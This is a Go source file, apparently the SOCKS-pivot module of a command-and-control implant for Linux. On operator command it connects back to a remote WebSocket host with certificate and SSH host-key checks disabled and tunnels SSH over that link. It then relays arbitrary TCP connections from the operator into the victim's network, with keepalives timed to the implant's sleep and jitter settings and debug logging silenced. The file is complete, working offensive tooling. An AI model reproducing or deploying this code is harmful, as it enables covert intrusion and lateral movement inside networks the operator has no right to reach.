// server/docker/payloads/Linux/action_socks.go

//go:build linux
// +build linux

package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	// "log"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

type SocksCommand struct {
	wsConn          *websocket.Conn
	sshClient       *ssh.Client
	running         bool
	mu              sync.RWMutex
	activeTunnels   map[string]*TunnelInfo
	tunnelsMu       sync.RWMutex
	maxConnections  int
	currentConns    int
	cleanupShutdown chan struct{}
}

// TunnelInfo tracks active SOCKS tunnel connections
type TunnelInfo struct {
	Target       string
	StartTime    time.Time
	LastActivity time.Time
	BytesSent    int64
	BytesRecv    int64
}

func (c *SocksCommand) Name() string {
	return "socks"
}

func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// log.Printf("[SOCKS] Execute called with %d args", len(args))

	// Get the JSON data from the CurrentCommand in context
	var rawData string

	ctx.mu.RLock()
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		rawData = ctx.CurrentCommand.Data
		// log.Printf("[SOCKS] Got data from CurrentCommand.Data")
	}
	ctx.mu.RUnlock()

	if rawData == "" {
		// log.Printf("[SOCKS] ERROR: No JSON data found in command")
		return CommandResult{
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// log.Printf("[SOCKS] Parsing configuration...")

	var socksData struct {
		Action      string `json:"action"`
		SocksPort   int    `json:"socks_port"`
		WSSPort     int    `json:"wss_port"`
		WSSHost     string `json:"wss_host"`
		Path        string `json:"path"`
		Credentials struct {
			Username string `json:"username"`
			Password string `json:"password"`
			SSHKey   string `json:"ssh_key"`
		} `json:"credentials"`
	}

	if err := json.Unmarshal([]byte(rawData), &socksData); err != nil {
		// log.Printf("[SOCKS] ERROR: Failed to unmarshal JSON: %v", err)
		return CommandResult{
			Error:       err,
			ErrorString: Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// log.Printf("[SOCKS] Config - Action: %s, WSSHost: %s, WSSPort: %d, Path: %s",
	// 	socksData.Action, socksData.WSSHost, socksData.WSSPort, socksData.Path)

	switch socksData.Action {
	case "start":
		// log.Printf("[SOCKS] Starting SOCKS tunnel client...")

		// Configure dialer with TLS settings
		dialer := websocket.Dialer{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			HandshakeTimeout:  10 * time.Second,
			EnableCompression: false,
		}

		// Build WebSocket URL
		wsURL := fmt.Sprintf("wss://%s:%d%s",
			socksData.WSSHost,
			socksData.WSSPort,
			socksData.Path,
		)
		// log.Printf("[SOCKS] Connecting to WebSocket: %s", wsURL)

		wsConn, resp, err := dialer.Dial(wsURL, nil)
		if err != nil {
			// log.Printf("[SOCKS] ERROR: WebSocket connection failed: %v", err)
			if resp != nil {
				_, _ = io.ReadAll(resp.Body)
				// log.Printf("[SOCKS] Response: %s", string(respBody))
				resp.Body.Close()
			}
			return CommandResult{
				Error:       err,
				ErrorString: Err(E12),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// log.Printf("[SOCKS] WebSocket connected successfully")

		// Configure SSH client
		sshConfig := &ssh.ClientConfig{
			User: socksData.Credentials.Username,
			Auth: []ssh.AuthMethod{
				ssh.Password(socksData.Credentials.Password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         10 * time.Second,
		}

		// Add SSH key authentication if provided
		if socksData.Credentials.SSHKey != "" {
			// log.Printf("[SOCKS] Decoding SSH key...")
			keyBytes, err := base64.StdEncoding.DecodeString(socksData.Credentials.SSHKey)
			if err != nil {
				// log.Printf("[SOCKS] Failed to decode SSH key: %v", err)
			} else {
				signer, err := ssh.ParsePrivateKey(keyBytes)
				if err == nil {
					sshConfig.Auth = append(sshConfig.Auth, ssh.PublicKeys(signer))
					// log.Printf("[SOCKS] SSH key authentication added")
				} else {
					// log.Printf("[SOCKS] Failed to parse SSH key: %v", err)
				}
			}
		}

		// log.Printf("[SOCKS] Starting SSH handshake as user: %s", socksData.Credentials.Username)

		// Wrap WebSocket connection for SSH
		wrapped := &wsConnWrapper{conn: wsConn}
		sshConn, chans, reqs, err := ssh.NewClientConn(wrapped, "", sshConfig)
		if err != nil {
			// log.Printf("[SOCKS] ERROR: SSH handshake failed: %v", err)
			wsConn.Close()
			return CommandResult{
				Error:       err,
				ErrorString: Err(E31),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// log.Printf("[SOCKS] SSH tunnel established successfully")

		// Store connections before creating client
		c.mu.Lock()
		c.wsConn = wsConn
		c.running = true
		c.activeTunnels = make(map[string]*TunnelInfo)
		c.maxConnections = 50 // Configurable limit
		c.currentConns = 0
		c.cleanupShutdown = make(chan struct{})
		c.mu.Unlock()

		// Start cleanup goroutine for stale connections
		go c.cleanupStaleTunnels()

		// Handle incoming channel requests (for forwarding)
		go c.handleChannels(chans)

		// Handle global requests
		go ssh.DiscardRequests(reqs)

		// Keep SSH connection alive (don't create a client that consumes channels)
		go c.keepAlive(sshConn)

		// log.Printf("[SOCKS] SOCKS tunnel ready - C2 port %d is now tunneled through this payload", socksData.SocksPort)

		return CommandResult{
			Output:      SuccCtx(S4, fmt.Sprintf("%d", socksData.SocksPort)),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case "stop":
		// log.Printf("[SOCKS] Stopping SOCKS tunnel...")

		c.mu.Lock()
		if c.cleanupShutdown != nil {
			close(c.cleanupShutdown)
		}
		if c.sshClient != nil {
			c.sshClient.Close()
		}
		if c.wsConn != nil {
			c.wsConn.Close()
		}
		c.running = false
		c.mu.Unlock()

		// log.Printf("[SOCKS] SOCKS tunnel stopped")
		return CommandResult{
			Output:      Succ(S5),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	default:
		return CommandResult{
			Error:       fmt.Errorf(ErrCtx(E21, socksData.Action)),
			ErrorString: ErrCtx(E21, socksData.Action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
	for {
		c.mu.RLock()
		running := c.running
		c.mu.RUnlock()

		if !running {
			break
		}

		// Calculate dynamic keepalive interval based on current sleep/jitter
		// This adapts to the agent's callback rate for consistency
		keepaliveInterval := c.calculateKeepaliveInterval()
		time.Sleep(keepaliveInterval)

		// Send keepalive request
		_, _, err := sshConn.SendRequest("keepalive@golang.org", true, nil)
		if err != nil {
			// log.Printf("[SOCKS] SSH connection lost: %v", err)
			// Trigger cleanup on connection failure
			c.mu.Lock()
			c.running = false
			if c.wsConn != nil {
				c.wsConn.Close()
			}
			c.mu.Unlock()
			break
		}
	}
}

// calculateKeepaliveInterval dynamically calculates keepalive interval
// based on current sleep/jitter to adapt to agent callback rate
func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
	// Default to 30 seconds for safety
	const (
		defaultInterval = 30 * time.Second
		minInterval     = 10 * time.Second  // Never go below 10s
		maxInterval     = 120 * time.Second // Cap at 2 minutes for responsiveness
	)

	// Parse current sleep value (can change during runtime)
	sleepSeconds := 60 // Default
	if parsedSleep, err := strconv.Atoi(sleep); err == nil && parsedSleep > 0 {
		sleepSeconds = parsedSleep
	}

	// Parse current jitter value (can change during runtime)
	jitterPercent := 10.0 // Default
	if parsedJitter, err := strconv.ParseFloat(jitter, 64); err == nil && parsedJitter >= 0 {
		jitterPercent = parsedJitter
	}

	// Calculate average callback interval: sleep * (1 + jitter/200)
	// We use jitter/200 because average offset is half of the jitter range
	avgCallbackInterval := float64(sleepSeconds) * (1.0 + jitterPercent/200.0)

	// Set keepalive to half the callback interval to ensure at least 2 keepalives per callback
	// This maintains connection health without being overly aggressive
	keepaliveInterval := time.Duration(avgCallbackInterval/2.0) * time.Second

	// Enforce bounds for safety and responsiveness
	if keepaliveInterval < minInterval {
		return minInterval
	}
	if keepaliveInterval > maxInterval {
		return maxInterval
	}

	return keepaliveInterval
}

// cleanupStaleTunnels periodically removes stale tunnel connections
func (c *SocksCommand) cleanupStaleTunnels() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			now := time.Now()
			c.tunnelsMu.Lock()

			for connID, info := range c.activeTunnels {
				// Remove tunnels idle for more than 5 minutes
				if now.Sub(info.LastActivity) > 5*time.Minute {
					// log.Printf("[SOCKS] Cleaning up stale tunnel: %s (target: %s)", connID, info.Target)
					delete(c.activeTunnels, connID)
					c.mu.Lock()
					c.currentConns--
					c.mu.Unlock()
				}
			}

			c.tunnelsMu.Unlock()

		case <-c.cleanupShutdown:
			// log.Printf("[SOCKS] Cleanup goroutine shutting down")
			return
		}
	}
}

func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
	// log.Printf("[SOCKS] Ready to handle forwarding channels")

	for newChannel := range chans {
		go c.handleChannelOpen(newChannel)
	}

	// log.Printf("[SOCKS] Channel handler stopped")
}

func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
	// log.Printf("[SOCKS] Received channel request type: %s", newChannel.ChannelType())

	if newChannel.ChannelType() != "direct-tcpip" {
		// log.Printf("[SOCKS] Rejecting unknown channel type: %s", newChannel.ChannelType())
		newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
		return
	}

	// Check connection limit
	c.mu.Lock()
	if c.currentConns >= c.maxConnections {
		c.mu.Unlock()
		// log.Printf("[SOCKS] Connection limit reached (%d), rejecting new connection", c.maxConnections)
		newChannel.Reject(ssh.ResourceShortage, "connection limit reached")
		return
	}
	c.currentConns++
	c.mu.Unlock()

	// Ensure we decrement counter on exit
	defer func() {
		c.mu.Lock()
		c.currentConns--
		c.mu.Unlock()
	}()

	// Parse the forwarding request
	var req struct {
		DestAddr   string
		DestPort   uint32
		OriginAddr string
		OriginPort uint32
	}

	if err := ssh.Unmarshal(newChannel.ExtraData(), &req); err != nil {
		// log.Printf("[SOCKS] Failed to parse channel request: %v", err)
		newChannel.Reject(ssh.ConnectionFailed, "failed to parse request")
		return
	}

	// The DestAddr contains the target address (host:port)
	target := req.DestAddr
	// log.Printf("[SOCKS] Connecting to target: %s", target)

	// Connect to the target with timeout
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		// log.Printf("[SOCKS] Failed to connect to %s: %v", target, err)
		newChannel.Reject(ssh.ConnectionFailed, fmt.Sprintf("failed to connect: %v", err))
		return
	}

	// Accept the channel
	channel, requests, err := newChannel.Accept()
	if err != nil {
		// log.Printf("[SOCKS] Failed to accept channel: %v", err)
		targetConn.Close()
		return
	}

	// log.Printf("[SOCKS] Channel accepted, starting proxy for %s", target)

	// Track this tunnel
	connID := fmt.Sprintf("%s_%d", target, time.Now().UnixNano())
	c.tunnelsMu.Lock()
	c.activeTunnels[connID] = &TunnelInfo{
		Target:       target,
		StartTime:    time.Now(),
		LastActivity: time.Now(),
		BytesSent:    0,
		BytesRecv:    0,
	}
	c.tunnelsMu.Unlock()

	// Cleanup tunnel tracking on exit
	defer func() {
		c.tunnelsMu.Lock()
		delete(c.activeTunnels, connID)
		c.tunnelsMu.Unlock()
	}()

	// Handle channel requests
	go ssh.DiscardRequests(requests)

	// Create error channel for propagation between goroutines
	errChan := make(chan error, 2)
	done := make(chan struct{})

	// Proxy data between channel and target
	var wg sync.WaitGroup
	wg.Add(2)

	// Channel -> Target
	go func() {
		defer wg.Done()
		_, err := c.copyWithTimeout(targetConn, channel, connID, true)
		if err != nil && err != io.EOF {
			// log.Printf("[SOCKS] Channel->Target error for %s: %v", target, err)
			select {
			case errChan <- err:
			default:
			}
		}
		// log.Printf("[SOCKS] Channel->Target transferred %d bytes for %s", bytes, target)
		// Close write side to signal EOF to target
		if tcpConn, ok := targetConn.(*net.TCPConn); ok {
			tcpConn.CloseWrite()
		}
	}()

	// Target -> Channel
	go func() {
		defer wg.Done()
		_, err := c.copyWithTimeout(channel, targetConn, connID, false)
		if err != nil && err != io.EOF {
			// log.Printf("[SOCKS] Target->Channel error for %s: %v", target, err)
			select {
			case errChan <- err:
			default:
			}
		}
		// log.Printf("[SOCKS] Target->Channel transferred %d bytes for %s", bytes, target)
		// Close write side to signal EOF to channel
		channel.CloseWrite()
	}()

	// Monitor for errors and force close on first error
	go func() {
		select {
		case <-errChan:
			// Error occurred, force close both connections
			targetConn.Close()
			channel.Close()
		case <-done:
			// Normal completion
		}
	}()

	wg.Wait()
	close(done)
	targetConn.Close()
	channel.Close()
	// log.Printf("[SOCKS] Connection closed for %s", target)
}

// copyWithTimeout copies data with timeout enforcement and activity tracking
func (c *SocksCommand) copyWithTimeout(dst io.Writer, src io.Reader, connID string, isSend bool) (int64, error) {
	const (
		bufferSize    = 32 * 1024 // 32KB buffer for efficient large file transfer
		idleTimeout   = 5 * time.Minute
		updateEvery   = 64 * 1024 // Update activity every 64KB
	)

	buf := make([]byte, bufferSize)
	var written int64
	var sinceLastUpdate int64

	for {
		// Set read deadline for idle timeout
		if conn, ok := src.(net.Conn); ok {
			conn.SetReadDeadline(time.Now().Add(idleTimeout))
		}

		nr, err := src.Read(buf)
		if nr > 0 {
			nw, ew := dst.Write(buf[0:nr])
			if nw > 0 {
				written += int64(nw)
				sinceLastUpdate += int64(nw)

				// Update activity tracking periodically to reduce lock contention
				if sinceLastUpdate >= updateEvery {
					c.tunnelsMu.Lock()
					if info, exists := c.activeTunnels[connID]; exists {
						info.LastActivity = time.Now()
						if isSend {
							info.BytesSent += sinceLastUpdate
						} else {
							info.BytesRecv += sinceLastUpdate
						}
					}
					c.tunnelsMu.Unlock()
					sinceLastUpdate = 0
				}
			}
			if ew != nil {
				return written, ew
			}
			if nr != nw {
				return written, io.ErrShortWrite
			}
		}
		if err != nil {
			// Final activity update
			if sinceLastUpdate > 0 {
				c.tunnelsMu.Lock()
				if info, exists := c.activeTunnels[connID]; exists {
					info.LastActivity = time.Now()
					if isSend {
						info.BytesSent += sinceLastUpdate
					} else {
						info.BytesRecv += sinceLastUpdate
					}
				}
				c.tunnelsMu.Unlock()
			}
			return written, err
		}
	}
}

// Buffer pool for WebSocket messages to reduce allocations
var wsBufferPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 0, 32*1024) // Pre-allocate 32KB capacity
		return &buf
	},
}

// WebSocket wrapper to implement net.Conn interface
type wsConnWrapper struct {
	conn       *websocket.Conn
	buf        []byte
	bufFromPool bool
}

func (w *wsConnWrapper) Read(b []byte) (n int, err error) {
	if len(w.buf) == 0 {
		_, message, err := w.conn.ReadMessage()
		if err != nil {
			return 0, err
		}

		// For large messages, use the message directly
		// For small messages, copy to pooled buffer to avoid holding WebSocket memory
		const largeMessageThreshold = 64 * 1024 // 64KB
		if len(message) > largeMessageThreshold {
			// Return pooled buffer if we had one
			if w.bufFromPool && cap(w.buf) > 0 {
				emptyBuf := w.buf[:0]
				wsBufferPool.Put(&emptyBuf)
				w.bufFromPool = false
			}
			w.buf = message
		} else {
			// Get pooled buffer for small messages
			if !w.bufFromPool {
				bufPtr := wsBufferPool.Get().(*[]byte)
				w.buf = (*bufPtr)[:0]
				w.bufFromPool = true
			}
			w.buf = append(w.buf[:0], message...)
		}
	}

	n = copy(b, w.buf)
	w.buf = w.buf[n:]

	// Return buffer to pool when fully consumed
	if len(w.buf) == 0 && w.bufFromPool {
		emptyBuf := w.buf[:0]
		wsBufferPool.Put(&emptyBuf)
		w.bufFromPool = false
		w.buf = nil
	}

	return n, nil
}

func (w *wsConnWrapper) Write(b []byte) (n int, err error) {
	err = w.conn.WriteMessage(websocket.BinaryMessage, b)
	if err != nil {
		return 0, err
	}
	return len(b), nil
}

func (w *wsConnWrapper) Close() error {
	return w.conn.Close()
}

func (w *wsConnWrapper) LocalAddr() net.Addr {
	return w.conn.LocalAddr()
}

func (w *wsConnWrapper) RemoteAddr() net.Addr {
	return w.conn.RemoteAddr()
}

func (w *wsConnWrapper) SetDeadline(t time.Time) error {
	if err := w.conn.SetReadDeadline(t); err != nil {
		return err
	}
	return w.conn.SetWriteDeadline(t)
}

func (w *wsConnWrapper) SetReadDeadline(t time.Time) error {
	return w.conn.SetReadDeadline(t)
}

func (w *wsConnWrapper) SetWriteDeadline(t time.Time) error {
	return w.conn.SetWriteDeadline(t)
}
